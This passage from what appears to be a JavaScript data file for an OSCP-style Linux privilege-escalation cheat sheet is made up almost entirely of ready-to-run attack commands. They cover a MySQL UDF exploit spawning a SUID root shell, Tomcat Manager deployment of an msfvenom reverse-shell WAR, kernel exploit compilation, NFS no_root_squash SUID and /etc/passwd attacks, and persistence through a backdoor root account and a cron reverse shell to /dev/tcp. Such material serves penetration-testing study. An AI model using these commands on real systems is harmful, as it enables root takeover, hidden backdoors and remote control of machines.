mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/my_udf.so';
mysql> create function do_system returns integer soname 'my_udf.so';
mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
mysql> exit

# 6. Execute the SUID shell
/tmp/rootbash -p`,
                code_language: bash,
            },
            {
                title: "Apache Exploitation",
                description: "",
                code: `# 1. Check if Apache runs as root
ps aux | grep apache | grep root

# 2. Access Apache configuration
cat /etc/apache2/apache2.conf
cat /etc/httpd/conf/httpd.conf

# 3. Look for modules executing as root or with SUID
find /usr/lib/apache2 -perm -u+s 2>/dev/null
find /usr/lib/httpd -perm -u+s 2>/dev/null

# 4. Looking for scripts with credentials
grep -r "password\\|user\\|pass" /var/www/ 2>/dev/null`,
                code_language: bash,
            },
            {
                title: "Tomcat Manager Exploitation",
                description: "",
                code: `# 1. Check if Tomcat Manager is accessible and for default credentials
curl -s http://localhost:8080/manager/html | grep "username"

# 2. Check for credentials in configuration files
cat /etc/tomcat*/tomcat-users.xml
cat /usr/share/tomcat*/conf/tomcat-users.xml

# 3. Deploy a malicious WAR file (if you have credentials)
# Create a JSP shell with msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f war > shell.war

# Upload it through curl
curl -v -u 'tomcat:password' -T shell.war 'http://localhost:8080/manager/text/deploy?path=/shell&update=true'

# Access the uploaded shell
curl http://localhost:8080/shell/`,
                code_language: bash,
            },
        ]
    },
    {
        chapter: "10. Kernel exploit, NFS root squashing",
        checks: [
            {
                title: "Kernel exploits",
                description: "Compiling and running kernel exploits",
                code: `# 1. run the script lse.sh to check for vulnerable kernel versions (wait for the end)
./lse.sh

# 2. compiling and running exploits:
# from attacker to 32-bit systems
i686-linux-gnu-gcc uncompiled.c -o exploit -w -Wno-error -Wno-implicit-function-declaration -Wno-int-conversion -static

# from attacker to 64-bit systems
gcc uncompiled.c -o exploit -w -Wno-error -Wno-implicit-function-declaration -Wno-int-conversion -static`,
                code_language: bash,
            },
            {
                title: "NFS root squashing",
                description: "",
                code: `# Understanding NFS and Root Squashing
# A. Network File System (NFS) allows remote systems to mount directories over a network
# B. Root squashing is a security feature that prevents remote root users from having root privileges on mounted shares
# C. When the no_root_squash option is set on an NFS share, a remote root user can create files with root ownership

# reference: https://juggernaut-sec.com/nfs-no_root_squash/

##### STEP 1: detection
# Check for mountable shares on the TARGET
showmount -e <target_IP>

# Nmap script to check for NFS shares
nmap -sV --script=nfs-showmount <target_IP>

# Check exports file on target (from low-priv user)
cat /etc/exports

# Look for: no_root_squash
grep -E "no_root_squash|no_all_squash" /etc/exports

##### STEP 2: exploitation when target has 'no_root_squash' enabled
# When the export file shows '/ *(rw,sync,insecure,no_root_squash,no_subtree_check)' 
# use one of the following attack paths:

# --- START --- #
# 1. On attacker system (must be root)
mkdir /tmp/nfs_mount
mount -t nfs <target_IP>:/shared/directory /tmp/nfs_mount
cd /tmp/nfs_mount

# OPTION 1: Create SUID binary
cat > root.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
  setuid(0);
  setgid(0);
  system("/bin/bash -p");
  return 0;
}
EOF

gcc root.c -o root
chmod +s root

# 2. As root on local system, set SUID bit on the binary
# On target system (The -p flag maintains EUID permissions)
/shared/directory/root
# --- END --- #

# --- START --- #
# OPTION 2: Simple SUID bash copy
cp /bin/bash /tmp/nfs_mount/bash
chmod +s /tmp/nfs_mount/bash

# On target run
/shared/directory/bash -p
# --- END --- #

# --- START --- #
# OPTION 3: Add entry to /etc/passwd
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash' > /tmp/nfs_mount/passwd.new
cat /etc/passwd >> /tmp/nfs_mount/passwd.new
mv /tmp/nfs_mount/passwd.new /tmp/nfs_mount/passwd

# On target, replace /etc/passwd with your version:
cp /shared/directory/passwd /etc/passwd

# Login with credentials: hacker:hacker
# --- END --- #

# CAUTION: If you get "file or directory not found" but can cat the file, you may be running a 64-bit executable on a 32-bit system (or vice versa).
`,
                code_language: bash,
            },
        ]
    },
    {
        chapter: "11. Quick search flags, persistence",
        checks: [
            {
                title: "Quick search flags",
                description: "",
                code: `# 1. search for the files 'local.txt' and 'proof.txt'
find / \\( -iname "local.txt" -o -iname "proof.txt" \\) -exec sh -c 'echo -e "\\n[+] $1"; cat "$1"' _ {} \\; 2>/dev/null

# 2. OSCP manner
find / \\( -iname "local.txt" -o -iname "proof.txt" \\) -exec sh -c 'printf "cat %s && whoami && ifconfig\\n" "$1"' _ {} \\; 2>/dev/null`,
                code_language: bash,
            },
            {
                title: "Persistence",
                description: "Techniques for acquiring persistence on a unix-system",
                code: `# 1. Add root user tempUserG:DiffPword951 if doesn't already exist
grep -q '^tempUserG:' /etc/passwd || echo "tempUserG:$(openssl passwd -1 DiffPword951):0:0::/root:/bin/bash" >> /etc/passwd

# 2. add a cron job that calls with a reverse bash shell for every minute
(crontab -l 2>/dev/null | grep -Fv "/dev/tcp/{{LHOST}}/{{LPORT}}"; echo "*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1'") | crontab -

# remove the cron job
crontab -l 2>/dev/null | grep -Fv "/dev/tcp/{{LHOST}}/{{LPORT}}" | crontab -`,
                code_language: bash,
            }
        ]
    },
]


// {
//     title: "",
//     description: "",
//     code: ``,
//     code_language: bash,
// },